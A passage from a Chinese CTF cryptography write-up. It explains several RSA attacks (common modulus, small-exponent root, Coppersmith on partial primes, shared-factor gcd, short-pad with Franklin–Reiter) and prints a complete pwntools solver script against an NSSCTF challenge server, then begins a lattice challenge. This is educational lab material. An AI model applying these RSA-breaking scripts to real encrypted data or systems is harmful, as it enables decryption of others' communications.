class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.899108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span><span class="mbin mtight">∗</span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>之后对m<sup>2</sup>开根就行了</p><h3 id="第六部分"><a class="markdownIt-Anchor" href="#第六部分"></a> 第六部分</h3><p>是m的线性填充攻击，但是不知道填充参数</p><p>根据exp看，应该是</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub><mo>=</mo><mi>m</mi><mspace linebreak="newline"></mspace><msub><mi>M</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mo>+</mo><mi>r</mi></mrow><annotation encoding="application/x-tex">M_1=m\\M_2=m+r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></span></p><p>找了xenny师傅exp的源码</p><p>先利用CoppersmithShortPadAttack求出填充的r，然后再利用franklinReiter就可以求解了</p><h2 id="exp-21"><a class="markdownIt-Anchor" href="#exp-21"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sage.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.anna.nssctf.cn&quot;</span>, <span class="hljs-number">28932</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;md5(str + &#x27;</span>)<br><br>last = p.recv(<span class="hljs-number">4</span>).decode()<br>p.recvuntil(<span class="hljs-string">b&#x27;[0:5] == &#x27;</span>)<br>known_md5 = p.recv(<span class="hljs-number">5</span>).decode()<br><br>temp = <span class="hljs-string">&quot;0123456789qwertyuiopasdfghjklzxcvbnm&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_md5</span>():<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> temp:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> temp:<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> temp:<br>                <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> temp:<br>                    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> temp:<br>                        a = (i + j + k + l + m + last).encode()<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(md5(a).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>] == known_md5:<br>                            <span class="hljs-keyword">return</span> i + j + k + l + m<br><br><br>all_md5 = calc_md5()<br>p.sendlineafter(<span class="hljs-string">b&#x27;Give me xxxxx: &#x27;</span>, all_md5.encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;n = &#x27;</span>)<br>n = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;e1 = &#x27;</span>)<br>e1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;e2 = &#x27;</span>)<br>e2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;c1 = &#x27;</span>)<br>c1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;c2 = &#x27;</span>)<br>c2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br><br>_, s1, s2 = gcdext(e1, e2)<br>m = <span class="hljs-built_in">pow</span>(c1, s1, n) * <span class="hljs-built_in">pow</span>(c2, s2, n) % n<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Please input your answer:&#x27;</span>, <span class="hljs-built_in">str</span>(m).encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;n = &#x27;</span>)<br>n = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;e = &#x27;</span>)<br>e = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;c = &#x27;</span>)<br>c = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>m = iroot(c, e)[<span class="hljs-number">0</span>]<br>p.sendlineafter(<span class="hljs-string">b&#x27;Please input your answer:&#x27;</span>, <span class="hljs-built_in">str</span>(m).encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;n = &#x27;</span>)<br>n = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;e = &#x27;</span>)<br>e = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;p&gt;&gt;448 = &#x27;</span>)<br>high_p = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;c = &#x27;</span>)<br>c = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>unknown_bits=<span class="hljs-number">448</span><br>high_p=high_p&lt;&lt;unknown_bits<br>R.&lt;x&gt; = PolynomialRing(Zmod(n))<br>f = high_p + x<br>x = f.small_roots(X = <span class="hljs-number">2</span>^unknown_bits,beta = <span class="hljs-number">0.4</span>)<br>pp=<span class="hljs-built_in">int</span>(high_p+x[<span class="hljs-number">0</span>])<br>m=<span class="hljs-built_in">pow</span>(c,invert(e,(pp-<span class="hljs-number">1</span>)*(n//pp-<span class="hljs-number">1</span>)),n)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Please input your answer:&#x27;</span>, <span class="hljs-built_in">str</span>(m).encode())<br><br>p.recvuntil(<span class="hljs-string">b&#x27;n1 = &#x27;</span>)<br>n1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;n2 = &#x27;</span>)<br>n2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;e1 = &#x27;</span>)<br>e1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;e2 = &#x27;</span>)<br>e2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;c1 = &#x27;</span>)<br>c1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;c2 = &#x27;</span>)<br>c2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip()[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><br>pp=gcd(n1,n2)<br>q = n1 // pp<br><br>phi = (pp-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>phi2 = (pp-<span class="hljs-number">1</span>)*(n2 // pp-<span class="hljs-number">1</span>)<br>d1 = invert(e1 // <span class="hljs-number">14</span>, phi)<br>d2 = invert(e2 // <span class="hljs-number">14</span>, phi2)<br>m1 = powmod(c1, d1, n1)<br>m2 = powmod(c2, d2, n2)<br>m = crt([m1,m2], [n1,n2])<br><span class="hljs-keyword">assert</span> m % n1 == m1<br><span class="hljs-keyword">assert</span> m % n2 == m2<br>n = q * (n2 // pp)<br>d = invert(<span class="hljs-number">7</span>, (q-<span class="hljs-number">1</span>)*(n2//pp-<span class="hljs-number">1</span>))<br>m = powmod(m, d, n)<br>m = iroot(m, <span class="hljs-number">2</span>)[<span class="hljs-number">0</span>]<br>p.sendlineafter(<span class="hljs-string">b&#x27;Please input your answer:&#x27;</span>, <span class="hljs-built_in">str</span>(m).encode())<br><br><br>p.recvuntil(<span class="hljs-string">b&#x27;n = &#x27;</span>)<br>n = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;e = &#x27;</span>)<br>e = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;c1 = &#x27;</span>)<br>c1 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br>p.recvuntil(<span class="hljs-string">b&#x27;c2 = &#x27;</span>)<br>c2 = <span class="hljs-built_in">int</span>(p.recvline().decode().strip())<br><br>_sage_const_0 = Integer(<span class="hljs-number">0</span>); _sage_const_1 = Integer(<span class="hljs-number">1</span>); _sage_const_30 = Integer(<span class="hljs-number">30</span>); _sage_const_2 = Integer(<span class="hljs-number">2</span>); _sage_const_0p5 = RealNumber(<span class="hljs-string">&#x27;0.5&#x27;</span>); _sage_const_25 = Integer(<span class="hljs-number">25</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CoppersmithShortPadAttack</span>(<span class="hljs-params">e,n,C1,C2,eps=_sage_const_1 /_sage_const_30 </span>):<br>    P = PolynomialRing(ZZ, names=(<span class="hljs-string">&#x27;x&#x27;</span>, <span class="hljs-string">&#x27;y&#x27;</span>,)); (x, y,) = P._first_ngens(<span class="hljs-number">2</span>)<br>    ZmodN = Zmod(n)<br>    g1 = x**e - C1<br>    g2 = (x+y)**e - C2<br>    res = g1.resultant(g2)<br>    P = PolynomialRing(ZmodN, names=(<span class="hljs-string">&#x27;y&#x27;</span>,)); (y,) = P._first_ngens(<span class="hljs-number">1</span>)<br>    rres = _sage_const_0 <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(res.coefficients())):<br>        rres += res.coefficients()[i]*(y**(res.exponents()[i][_sage_const_1 ]))<br><br>    diff = rres.small_roots(epsilon=eps)<br>    <span class="hljs-keyword">if</span> diff:<br>        <span class="hljs-keyword">return</span> diff[_sage_const_0 ]<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>r=CoppersmithShortPadAttack(e, n, c1, c2)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">franklinReiter</span>(<span class="hljs-params">n,e,r,c1,c2</span>):<br>    R = Zmod(n)[<span class="hljs-string">&#x27;X&#x27;</span>]; (X,) = R._first_ngens(<span class="hljs-number">1</span>)<br>    f1 = X**e - c1<br>    f2 = (X + r)**e - c2<br>    <span class="hljs-keyword">return</span> Integer(n-(compositeModulusGCD(f1,f2)).coefficients()[_sage_const_0 ])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compositeModulusGCD</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">if</span>(b == _sage_const_0 ):<br>        <span class="hljs-keyword">return</span> a.monic()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> compositeModulusGCD(b, a % b)<br>m=franklinReiter(n,e,r,c1,c2)<br>m=long_to_bytes(m)<br>m=m.decode()[<span class="hljs-number">16</span>:]<br>p.sendlineafter(<span class="hljs-string">b&#x27;Please input the password:&#x27;</span>, <span class="hljs-built_in">str</span>(m).encode())<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="深育杯-2021gege"><a class="markdownIt-Anchor" href="#深育杯-2021gege"></a> [深育杯 2021]GeGe</h1><h2 id="题目-22"><a class="markdownIt-Anchor" href="#题目-22"></a> 题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">plaintext</span>):<br>    p = getStrongPrime(<span class="hljs-number">3072</span>) <br>    m = bytes_to_long(plaintext)<br>    r = getRandomNBitInteger(<span class="hljs-number">1024</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = getRandomNBitInteger(<span class="hljs-number">1024</span>)<br>        g = getStrongPrime(<span class="hljs-number">768</span>)<br>        h = gmpy2.invert(f, p) * g % p<br>        c = (r * h + m * f) % p<br>        <span class="hljs-keyword">return</span> (h, p, c)<br><br>h, p, c = encrypt(flag)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;cipher.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&quot;h = &quot;</span> + <span class="hljs-built_in">str</span>(h) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    f.write(<span class="hljs-string">&quot;p = &quot;</span> + <span class="hljs-built_in">str</span>(p) + <span class="hljs-string">&quot;\n&quot;</span>)<br>    f.write(<span class="hljs-string">&quot;c = &quot;</span> + <span class="hljs-built_in">str</span>(c) + <span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">h = 3967900409518491437091166715380802161532841159072519563471354336400750930009970177101953304861954502146570721506995224520631716261108071684882841102381144720177664434981608584075201907891964214604246219441325377602163957172642582158192223452845671007585556951922415200415538060247456213608112360361636912703380306386439846269645696750929811607783895294670639202472465920599542568227657152922843001792754116981992696203788298740550812661583820191877594185184758074771316815650833195023325150218113883046328740408517222933980589974912467363367727038230703152354450353199257411964288022409128890352346036423792759938468964462267528727695183747947515480432786669353434638860350849296620606820894819933050645748656981993408399675189724419997805599649975500093890450393421897803267909569938850674774386012819838940544502656293639875120854745249463561940935651895728242282430164407574626178693654713011323376912585958110558532953333</span><br><span class="hljs-string">p = 4407206782832544188667944201727813617189883940490534227436068867901196311508151544316989531306678865408607390128649278629254128753967046691736522108356971272311308455619879297358588727267184200777923695048248757115057072357087881336680504033511958280710547178971268670442650871890760916203109226852889599638484429889898210426540567794020013920566784973281560628666918122674783539653720295629054898529900882965691587718212291373734218555167591690910246380516121338139063419587750344469214004539520017140593342859857394308703001939640899189432836134392830208318268131639318655382175643272565186884496188876341460968563623529229713790076050095498053846983536874648190033735162809614805624209827336432223553914651838063614534617044557310972056169869738746432924853953258079006936103497626054364115282007843847693813896856977882285910369660539092462408790126385881581833165309032853389777355480169212478669139225609058338565029211</span><br><span class="hljs-string">c = 4052491539376955553220568757544621659293304958837707160681090710624505862889512520190589879197831394720145909992216099963759496125523078969015706069688556356682711471641851937470179182960755800968587551608595725470945584970094036299764623894583379909329996337429067328575804567222496890803396234507278490116354758303807070775249711087938549824010697869930856205244006491475201993228121418890520174179969294094963249013786611889790711801269524919695653453576043288934196952437164829830756439734795068980207758771052483500272264363028346668629397497794792110170275173209377114274164087320163340547019935562316429227119346802124620682293405375798340275679831750482339301440428527223801872439611461272229275824994734898078664180541096159146759378804836952981089673755590353588900522455968721971944276318473421193690310601002295637581030417570868955379815661133148339565983621730401675643094909263098778572081973142223744746526672</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="分析-22"><a class="markdownIt-Anchor" href="#分析-22"></a> 分析</h2><p>一道格的入门题，格的学习我是看这位师傅的，具体原理我也不太懂，纯纯的脚本小子</p><p><a href="https://dexterjie.github.io/2023/07/28/%E5%88%9D%E8%AF%86%E6%A0%BC">https://dexterjie.github.io/2023/07/28/初识格</a></p><p><a href="https://dexterjie.github.io/2023/07/29/%E6%A0%BC%E5%AF%86%E7%A0%81%E5%85%A5%E9%97%A8">https://dexterjie.github.io/2023/07/29/格密码入门</a></p><p>我们知道：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mo>=</mo><msup><mi>f</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>∗</mo><mi>g</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>c</mi><mo>=</mo><mi>r</mi><mo>∗</mo><mi>h</mi><mo>+</mo><mi>m</mi><mo>∗</mo><mi>f</mi><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">h=f^{-1}*g\quad mod(p)\\c=r*h+m*f \quad mod(p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.058548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">h</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><p>可以求得：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo>∗</mo><mi>h</mi><mo>=</mo><mi>k</mi><mo>∗</mo><mi>p</mi><mo>+</mo><mi>g</mi><mspace linebreak="newline"></mspace><mi>g</mi><mo>=</mo><mi>f</mi><mo>∗</mo><mi>h</mi><mo>−</mo><mi>k</mi><mo>∗</mo><mi>p</mi><mspace linebreak="newline"></mspace><mtext>构造格：</mtext><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" 